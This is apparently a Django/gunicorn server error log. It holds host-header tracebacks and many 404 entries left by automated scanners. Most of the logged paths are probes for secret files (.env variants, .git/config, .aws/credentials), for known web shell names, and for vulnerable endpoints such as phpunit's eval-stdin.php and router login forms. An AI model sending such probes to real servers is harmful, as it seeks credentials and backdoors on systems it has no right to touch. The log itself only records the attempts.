  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /webui/
Not Found: /geoserver/web/
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.env.production.local
Not Found: /.env.sandbox
Not Found: /.env.tmp
Not Found: /app/resources/.git/config
Not Found: /.env.secret
Not Found: /.env.stage
Not Found: /backup/.env
Not Found: /wp-content/plugins/hellopress/wp_filemanager.php
Not Found: /403.php
Not Found: /content.php
Not Found: /wp-content/plugins/not/includes/about.php
Not Found: /wp-content/plugins/simple/simple.php
Not Found: /wp-content/plugins/wp-theme-editor/include.php
Not Found: /wp-content/themes/aahana/json.php
Not Found: /admin.php
Not Found: /wp-content/plugins/awesome-coming-soon/come.php
Not Found: /wp-content/plugins/wp-conflg.php
Not Found: /berlin.php
Not Found: /wp-includes/Requests/about.php
Not Found: /wp-includes/style-engine/about.php
Not Found: /wp-includes/rest-api/about.php
Not Found: /wp-includes/SimplePie/about.php
Not Found: /wp-content/banners/about.php
Not Found: /wp-content/about.php
Not Found: /.well-known/about.php
Not Found: /wp-includes/Text/about.php
Not Found: /wp-includes/ID3/about.php
Not Found: /img/about.php
Not Found: /wp-content/languages/about.php
Not Found: /wp-includes/customize/about.php
Not Found: /wp-includes.bak/html-api/about.php
Not Found: /wp-includes/widgets/about.php
Not Found: /wp-includes/IXR/about.php
Not Found: /wp-admin/js/about.php
Not Found: /.well-known/pki-validation/about.php
Not Found: /wp-includes/pomo/about.php
Not Found: /wp-includes/block-patterns/about.php
Not Found: /wp-content/updraft/about.php
Not Found: /wp-content/upgrade-temp-backup/about.php
Not Found: /wp-content/themes/about.php
Not Found: /wp-admin/includes/about.php
Not Found: /images/about.php
Not Found: /wp-content/blogs.dir/about.php
Not Found: /wp-includes/images/about.php
Not Found: /wp-includes/about.php
Not Found: /cgi-bin/about.php
Not Found: /wp-content/gallery/about.php
Not Found: /wp-includes/blocks/about.php
Not Found: /wp-admin/css/about.php
Not Found: /wp-admin/images/about.php
Not Found: /.well-known/pki-validation/cloud.php
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /wp-admin/network/cloud.php
Not Found: /cloud.php
Not Found: /cgi-bin/cloud.php
Not Found: /wp-content/updates.php
Not Found: /css/cloud.php
Not Found: /wp-admin/user/cloud.php
Not Found: /img/cloud.php
Not Found: /wp-admin/css/colors/coffee/cloud.php
Not Found: /wp-admin/images/cloud.php
Not Found: /avaa.php
Not Found: /images/cloud.php
Not Found: /wp-admin/js/widgets/cloud.php
Not Found: /wp-includes/Requests/Text/admin.php
Not Found: /wp-admin/css/colors/cloud.php
Not Found: /wp-admin/includes/cloud.php
Not Found: /wp-admin/css/colors/blue/cloud.php
Not Found: /wp-admin/cloud.php
Not Found: /updates.php
Not Found: /libraries/legacy/updates.php
Not Found: /libraries/phpmailer/updates.php
Not Found: /libraries/vendor/updates.php
Not Found: /alfa-rex.php7
Not Found: /alfanew.php
Not Found: /wp-content/plugins/Cache/Cache.php
Not Found: /wp-admin/js/widgets/about.php7
Not Found: /wp-p.php7
Not Found: /wp-admin/repeater.php
Not Found: /wp-includes/repeater.php
Not Found: /wp-content/repeater.php
Not Found: /wsoyanz.php
Not Found: /yanz.php
Not Found: /wp-admin/js/about.php
Not Found: /wp-content/plugins/seoo/wsoyanz.php
Not Found: /wp-content/plugins/seoo/wsoyanz1.php
Not Found: /cache-compat.php
Not Found: /ajax-actions.php
Not Found: /wp-admin/ajax-actions.php
Not Found: /wp-consar.php
Not Found: /repeater.php
Not Found: /admin-post.php
Not Found: /wp-admin/maint/maint/ajax-actions.php
Not Found: /wp-admin/dropdown.php
Not Found: /wp-admin/css/index.php
Not Found: /dropdown.php
Not Found: /about.php
Not Found: /admin.php
Not Found: /about.php7
Not Found: /alfanew.php7
Not Found: /adminfuns.php7
Not Found: /ebs.php7
Not Found: /ws.php7
Not Found: /alfanew2.php7
Not Found: /alfa-rex2.php7
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /wp-admin/images/index.php
Not Found: /wp-admin/css/colors/index.php
Not Found: /wp-content/themes/pridmag/db.php
Not Found: /wp-content/themes/seotheme/mar.php
Not Found: /wp-content/plugins/linkpreview/db.php
Not Found: /wp-content/themes/seotheme/db.php
Not Found: /wp-content/plugins/seoplugins/db.php
Not Found: /wp-content/plugins/seoplugins/mar.php
Not Found: /.well-known/pki-validation/xmrlpc.php
Not Found: /.well-known/acme-challenge/xmrlpc.php
Not Found: /wp-admin/network/xmrlpc.php
Not Found: /xmrlpc.php
Not Found: /cgi-bin/xmrlpc.php
Not Found: /css/xmrlpc.php
Not Found: /wp-admin/user/xmrlpc.php
Not Found: /img/xmrlpc.php
Not Found: /wp-admin/css/colors/coffee/xmrlpc.php
Not Found: /wp-admin/images/xmrlpc.php
Not Found: /images/xmrlpc.php
Not Found: /wp-admin/js/widgets/xmrlpc.php
Not Found: /wp-admin/css/colors/xmrlpc.php
Not Found: /wp-admin/includes/xmrlpc.php
Not Found: /wp-admin/css/colors/blue/xmrlpc.php
Not Found: /wp-admin/xmrlpc.php
Not Found: /403.php
Not Found: /content.php
Not Found: /wp-content/plugins/not/includes/about.php
Not Found: /wp-content/plugins/simple/simple.php
Not Found: /wp-content/plugins/wp-theme-editor/include.php
Not Found: /wp-content/themes/aahana/json.php
Not Found: /admin.php
Not Found: /wp-content/plugins/awesome-coming-soon/come.php
Not Found: /wp-content/plugins/wp-conflg.php
Not Found: /berlin.php
Not Found: /wp-includes/Requests/about.php
Not Found: /wp-includes/style-engine/about.php
Not Found: /wp-includes/rest-api/about.php
Not Found: /wp-includes/SimplePie/about.php
Not Found: /wp-content/banners/about.php
Not Found: /wp-content/about.php
Not Found: /.well-known/about.php
Not Found: /wp-includes/Text/about.php
Not Found: /wp-includes/ID3/about.php
Not Found: /img/about.php
Not Found: /wp-content/languages/about.php
Not Found: /wp-includes/customize/about.php
Not Found: /wp-includes.bak/html-api/about.php
Not Found: /wp-includes/widgets/about.php
Not Found: /wp-includes/IXR/about.php
Not Found: /wp-admin/js/about.php
Not Found: /.well-known/pki-validation/about.php
Not Found: /wp-includes/pomo/about.php
Not Found: /wp-includes/block-patterns/about.php
Not Found: /wp-content/updraft/about.php
Not Found: /wp-content/upgrade-temp-backup/about.php
Not Found: /wp-content/themes/about.php
Not Found: /wp-admin/includes/about.php
Not Found: /images/about.php
Not Found: /wp-content/blogs.dir/about.php
Not Found: /wp-includes/images/about.php
Not Found: /wp-includes/about.php
Not Found: /cgi-bin/about.php
Not Found: /wp-content/gallery/about.php
Not Found: /wp-includes/blocks/about.php
Not Found: /wp-admin/css/about.php
Not Found: /wp-admin/images/about.php
Not Found: /.well-known/pki-validation/cloud.php
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /wp-admin/network/cloud.php
Not Found: /cloud.php
Not Found: /cgi-bin/cloud.php
Not Found: /wp-content/updates.php
Not Found: /css/cloud.php
Not Found: /wp-admin/user/cloud.php
Not Found: /img/cloud.php
Not Found: /wp-admin/css/colors/coffee/cloud.php
Not Found: /wp-admin/images/cloud.php
Not Found: /avaa.php
Not Found: /images/cloud.php
Not Found: /wp-admin/js/widgets/cloud.php
Not Found: /wp-includes/Requests/Text/admin.php
Not Found: /wp-admin/css/colors/cloud.php
Not Found: /wp-admin/includes/cloud.php
Not Found: /wp-admin/css/colors/blue/cloud.php
Not Found: /wp-admin/cloud.php
Not Found: /updates.php
Not Found: /libraries/legacy/updates.php
Not Found: /libraries/phpmailer/updates.php
Not Found: /libraries/vendor/updates.php
Not Found: /alfa-rex.php7
Not Found: /alfanew.php
Not Found: /wp-content/plugins/Cache/Cache.php
Not Found: /wp-admin/js/widgets/about.php7
Not Found: /wp-p.php7
Not Found: /wp-admin/repeater.php
Not Found: /wp-includes/repeater.php
Not Found: /wp-content/repeater.php
Not Found: /wsoyanz.php
Not Found: /yanz.php
Not Found: /wp-admin/js/about.php
Not Found: /wp-content/plugins/seoo/wsoyanz.php
Not Found: /wp-content/plugins/seoo/wsoyanz1.php
Not Found: /cache-compat.php
Not Found: /ajax-actions.php
Not Found: /wp-admin/ajax-actions.php
Not Found: /wp-consar.php
Not Found: /repeater.php
Not Found: /admin-post.php
Not Found: /wp-admin/maint/maint/ajax-actions.php
Not Found: /wp-admin/dropdown.php
Not Found: /wp-admin/css/index.php
Not Found: /dropdown.php
Not Found: /about.php
Not Found: /admin.php
Not Found: /about.php7
Not Found: /alfanew.php7
Not Found: /adminfuns.php7
Not Found: /ebs.php7
Not Found: /ws.php7
Not Found: /alfanew2.php7
Not Found: /alfa-rex2.php7
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /wp-admin/images/index.php
Not Found: /wp-admin/css/colors/index.php
Not Found: /wp-content/themes/pridmag/db.php
Not Found: /wp-content/themes/seotheme/mar.php
Not Found: /wp-content/plugins/linkpreview/db.php
Not Found: /wp-content/themes/seotheme/db.php
Not Found: /wp-content/plugins/seoplugins/db.php
Not Found: /wp-content/plugins/seoplugins/mar.php
Not Found: /.well-known/pki-validation/xmrlpc.php
Not Found: /.well-known/acme-challenge/xmrlpc.php
Not Found: /wp-admin/network/xmrlpc.php
Not Found: /xmrlpc.php
Not Found: /cgi-bin/xmrlpc.php
Not Found: /css/xmrlpc.php
Not Found: /wp-admin/user/xmrlpc.php
Not Found: /img/xmrlpc.php
Not Found: /wp-admin/css/colors/coffee/xmrlpc.php
Not Found: /wp-admin/images/xmrlpc.php
Not Found: /images/xmrlpc.php
Not Found: /wp-admin/js/widgets/xmrlpc.php
Not Found: /wp-admin/css/colors/xmrlpc.php
Not Found: /wp-admin/includes/xmrlpc.php
Not Found: /wp-admin/css/colors/blue/xmrlpc.php
Not Found: /wp-admin/xmrlpc.php
Not Found: /.env.backup
Not Found: /app/frontend/.git/config
Not Found: /dev/backup/.git/config
Not Found: /app/dev/.git/config
Not Found: /app/resources/.git/config
Not Found: /core/config/.git/config
Not Found: /.env.dev.local
Not Found: /docker/.git/config
Not Found: /.env.secret
Not Found: /app/config/.git/config
Not Found: /.git/config
Not Found: /test_environment/.git/config
Not Found: /tmp/.env
Not Found: /.env.prod.local
Not Found: /.env.production
Not Found: /api/.env
Not Found: /data/.git/config
Not Found: /modules/api/.git/config
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /robots.txt
Not Found: /.env.bak
Not Found: /.env.init
Not Found: /integration/.git/config
Not Found: /logs/temp/.git/config
Not Found: /test_configs/.git/config
Not Found: /.env.uat
Not Found: /.env.qa
Not Found: /releases/.git/config
Not Found: /private/.env
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.env.testing
Not Found: /robots.txt
Not Found: /wp-admin/setup-config.php
Not Found: /wp-admin/install.php
Not Found: /wordpress/wp-admin/setup-config.php
Not Found: /wordpress/wp-admin/install.php
Not Found: /wp/wp-admin/setup-config.php
Not Found: /wp/wp-admin/install.php
Not Found: /new/wp-admin/setup-config.php
Not Found: /new/wp-admin/install.php
Not Found: /old/wp-admin/setup-config.php
Not Found: /old/wp-admin/install.php
Not Found: /blog/wp-admin/setup-config.php
Not Found: /blog/wp-admin/install.php
Not Found: /test/wp-admin/setup-config.php
Not Found: /test/wp-admin/install.php
Not Found: /shop/wp-admin/setup-config.php
Not Found: /shop/wp-admin/install.php
Not Found: /cgi-bin/luci/;stok=/locale
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.git/index
Not Found: //pagead2.googlesyndication.com/pagead/js/adsbygoogle.js
Not Found: //pagead2.googlesyndication.com/pagead/js/adsbygoogle.js
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /archivarix.cms.php
Not Found: /cgi-bin/luci/;stok=/locale
Bad Request: /contact/
Forbidden (CSRF token missing.): /contact/
Not Found: /contact.html
Not Found: /.env
Not Found: /login
Not Found: /.env
Not Found: /.env
Not Found: /.env.local
Not Found: /.env.production
Not Found: /blog.env
Not Found: /wp-content/.env
Not Found: /application/.env
Not Found: /app/.env
Not Found: /config/.env
Not Found: /api/.env
Not Found: /config.json
Not Found: /laravel/.env
Not Found: /library/.env
Not Found: /nextjs-app/.env
Not Found: /node-api/.env
Not Found: /vendor/.env
Not Found: /.aws/credentials
Not Found: /home/user/.aws/credentials
Not Found: /myproject/.env
Not Found: /.envs/.production/.django
Not Found: /react-app/.env
Not Found: /react-app/.env.production
Not Found: /config/secrets.json
Not Found: /config/settings.json
Not Found: /config.yaml
Not Found: /config.yml
Not Found: /config.py
Not Found: /phpinfo
Not Found: /_profiler/phpinfo
Not Found: /phpinfo.php
Not Found: /info.php
Not Found: /.env
Not Found: /backend/.env
Not Found: /api/.env
Not Found: /info/
Not Found: /app_dev.php/_profiler/open
Not Found: /.env.example
Not Found: /phpinfo.php
Not Found: /.env.production
Not Found: /app_dev.php/_profiler/phpinfo
Not Found: /demo/.env
Not Found: /app/.env
Not Found: /core/.env
Not Found: /.aws/credentials
Not Found: /Dev/.env
Not Found: /secrets.env
Not Found: /test/.env
Not Found: /blogs/.env
Not Found: /client/.env
Not Found: /templates/.env
Not Found: /saas/.env
Not Found: /content/.env
Not Found: /old/.env
Not Found: /.gitlab-ci/.env
Not Found: /docker/.env
Not Found: /etc/.env
Not Found: /alpha/.env
Not Found: /basic-network/.env
Not Found: /configurations/.env
Not Found: /core/database/.env
Not Found: /cpresources/.env
Not Found: /env_variables.env
Not Found: /extension/.env
Not Found: /functions/.env
Not Found: /javascript/.env
Not Found: /laravel/public/.env
Not Found: /newsite/.env
Not Found: /node_modules/.env
Not Found: /owncloud/.env
Not Found: /packages/web/.env
Not Found: /pemerintah/.env
Not Found: /portal2/.env
Not Found: /registration/.env
Not Found: /site-library/.env
Not Found: /spearmint/.env
Not Found: /src/main/front-end/.env
Not Found: /stylesheets/.env
Not Found: /user-config.json
Not Found: /web-dist/.env
Not Found: /webstatic/.env
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /robots.txt
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /robots.txt
Not Found: /webui/
Not Found: /geoserver/web/
Not Found: /.git/HEAD
Not Found: /cgi-bin/luci/;stok=/locale
Invalid HTTP_HOST header: '103.147.86.158:x'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '103.147.86.158:x'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Bad Request: /GponForm/diag_Form
Not Found: /cgi-bin/luci/;stok=/locale
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /thoms.php
Not Found: /thoms.php
Not Found: /inputs.php
Not Found: /inputs.php
Not Found: /userfuns.php
Not Found: /userfuns.php
Not Found: /tempfuns.php
Not Found: /tempfuns.php
Not Found: /termps.php
Not Found: /termps.php
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /boaform/admin/formLogin
Not Found: /libs/js/iframe.js
Not Found: /robots.txt
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /youtube-video-downloader/index.html/
Not Found: /robots.txt
Not Found: /youtube-video-downloader/contact.html/
Not Found: /.env
Not Found: /.ENV
Not Found: /.Env
Not Found: /.AWS/credentials
Not Found: /.AWS/CREDENTIALS
Not Found: /.Aws/credentials
Not Found: /.CONFIG.yaml
Not Found: /.Config.yaml
Not Found: /.env.BAK
Not Found: /.ENV.example
Not Found: /.env.EXAMPLE
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /index.html
Not Found: /robots.txt
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /robots.txt
Not Found: /.git/refs/
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /data/staging/.git/config
Not Found: /files/.git/config
Not Found: /scripts/dev/.git/config
Not Found: /server/.git/config
Not Found: /temp/.git/config
Not Found: /v1/.git/config
Not Found: /app/config/.git/config
Not Found: /sandbox/.git/config
Not Found: /data/.git/config
Not Found: /modules/api/.git/config
Not Found: /www/.git/config
Not Found: /templates/.git/config
Not Found: /build_tool/.git/config
Not Found: /staging_environment/.git/config
Not Found: /test/.git/config
Not Found: /core/config/.git/config
Not Found: /data/processing/.git/config
Not Found: /repo/.git/config
Not Found: /lib/.git/config
Not Found: /modules/db/.git/config
Not Found: /modules/utils/.git/config
Not Found: /staging_area/.git/config
Not Found: /user/.git/config
Not Found: /ci/cd/.git/config
Not Found: /ci/.git/config
Not Found: /config_files/.git/config
Not Found: /core/.git/config
Not Found: /dev/backup/.git/config
Not Found: /data/private/.git/config
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /vendor/phpunit/phpunit/phpunit.xsd
Not Found: /xmlrpc.php
Not Found: /robots.txt
Not Found: /Public/home/js/check.js
Not Found: /robots.txt
Not Found: /index.html
Not Found: /public/index.php
Not Found: /public/index.php
Not Found: /public/index.php
Not Found: /index.php
Not Found: /index.php
Not Found: /index.php
Forbidden (CSRF cookie not set.): /admin/index.php/
Forbidden (CSRF cookie not set.): /admin/index.php/
Forbidden (CSRF cookie not set.): /admin/index.php/
Forbidden (CSRF cookie not set.): /admin/spread.php
Forbidden (CSRF cookie not set.): /admin/spread.php
Not Found: /phpmyadmin/index.php
Not Found: /index.php
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /login.rsp
Not Found: /hello.world
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
Not Found: /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /index.php
Not Found: /public/index.php
Not Found: /index.php
Not Found: /index.php
Not Found: /containers/json
Not Found: /cgi-bin/luci/;stok=/locale
